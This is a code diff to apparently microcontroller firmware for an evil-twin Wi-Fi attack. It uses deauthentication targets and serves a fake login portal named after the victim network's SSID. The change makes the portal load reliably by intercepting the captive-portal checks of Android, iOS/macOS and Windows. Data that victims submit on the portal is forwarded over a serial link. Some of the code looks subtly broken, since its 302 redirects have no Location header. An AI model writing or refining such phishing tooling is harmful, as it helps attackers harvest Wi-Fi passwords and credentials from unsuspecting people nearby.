@@ -210,11 +210,14 @@ void destroyAP(){
 
 
 String makeResponse(int code, String content_type, bool compresed) {
-  String response = "HTTP/1.1 " + String(code) + " OK\n";
+  String response = "HTTP/1.1 ";
+  response += String(code);
+  response += (code == 200) ? " OK" : (code == 302) ? " Found" : " Not Found";
+  response += "\r\n";
   if(compresed)
-  response += "Content-Encoding: gzip\n";
-  response += "Content-Type: " + content_type + "\n";
-  response += "Connection: close\n\n";
+  response += "Content-Encoding: gzip\r\n";
+  response += "Content-Type: " + content_type + "\r\n";
+  response += "Connection: close\r\n\r\n";
   return response;
 }
 
@@ -635,11 +638,40 @@ void loop() {
             }
             String path = parseRequest(request);
             Serial.println(request);
-            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
+            
+            // Captive portal detection URLs - return 302 redirect or non-success response
+            if(path.startsWith("/generate_204") || path.startsWith("/gen_204")) {
+              // Android captive portal check
+              String response = makeResponse(302, "text/html", false);
+              client.write(response.c_str());
+              break;
+              
+            } else if(path.startsWith("/hotspot-detect.html") || 
+                      path.startsWith("/library/test/success.html") ||
+                      path.startsWith("/success.txt")) {
+              // iOS/macOS captive portal check - serve portal instead of success
               if (deauth_wifis.size() != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
                 handleRequest(client, (enum portals)portal, "router");
+              break;
+              
+            } else if(path.startsWith("/ncsi.txt") || 
+                      path.startsWith("/connecttest.txt") ||
+                      path.startsWith("/redirect")) {
+              // Windows captive portal check
+              String response = makeResponse(302, "text/html", false);
+              client.write(response.c_str());
+              break;
+              
+            } else if(path.startsWith("/userinput") || path.startsWith("/login") || 
+                      path.startsWith("/?") || path.equals("/") || path.startsWith("/get")) {
+              // Main portal pages
+              if (deauth_wifis.size() != 0)
+                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
+              else
+                handleRequest(client, (enum portals)portal, "router");
+                
               if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
                 String datos = path.substring(path.indexOf('?') + 1);
                 if (datos.length() > 0) {
@@ -647,10 +679,12 @@ void loop() {
                   Serial1.println(datos);
                 }
               }
-          }else{
-            handle404(client);
-          }   
-          break;
+              break;
+              
+            } else {
+              handle404(client);
+              break;
+            }
 
           }else if(character == '%'){
             char buff[2] ;
